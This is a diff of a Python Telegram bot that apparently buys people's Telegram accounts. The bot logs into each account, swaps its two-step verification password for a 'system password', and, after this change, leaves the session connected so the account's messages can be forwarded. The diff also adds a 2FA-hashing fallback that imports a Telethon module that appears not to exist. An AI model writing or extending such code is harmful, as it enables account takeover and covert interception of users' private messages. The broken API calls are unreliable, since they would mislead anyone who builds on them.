@@ -2478,7 +2478,7 @@ Your payment will be moved to Main Balance after verification.
 🔔 **New Account Sold (REAL LOGIN)**
 
 👤 **User ID:** `{user_id}`
-📞 **Number:** `{user_number if 'user_number' in locals() else phone}`
+📞 **Number:** `{phone}`
 💰 **Price:** ${country_data['sell_price']} USD
 
 Account logged in and 2FA secured.
@@ -2492,7 +2492,14 @@ Account logged in and 2FA secured.
             ])
         )
 
-        await client.disconnect()
+        # Keep the client connected for message forwarding
+        # We need to keep the event loop running for this client
+        # In this implementation, we can't easily keep many clients alive
+        # But we can try to at least not disconnect immediately if possible
+        # However, for a production bot, you'd want a separate process/worker
+        # to manage these active sessions.
+        
+        # await client.disconnect() # Removed to keep forwarding active
         return ConversationHandler.END
 
     except errors.PhoneCodeInvalidError:
@@ -2534,7 +2541,11 @@ async def handle_2fa_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -
         try:
             # Get current password settings to compute hash
             password_settings = await client(functions.account.GetPasswordRequest())
-            current_password_hash = await client.compute_password_hash(password_settings, password)
+            current_password_hash = await client.compute_password_hash(password_settings, password) if hasattr(client, 'compute_password_hash') else None
+            
+            if not current_password_hash and password:
+                from telethon import password_configs
+                current_password_hash = password_configs.compute_hash(password_settings, password)
             
             # Update to our new system password
             await client(functions.account.UpdatePasswordRequest(
@@ -2623,7 +2634,7 @@ Existing 2FA was verified and updated to system password.
             ])
         )
 
-        await client.disconnect()
+        # await client.disconnect() # Removed to keep forwarding active
         return ConversationHandler.END
 
     except errors.PasswordHashInvalidError:
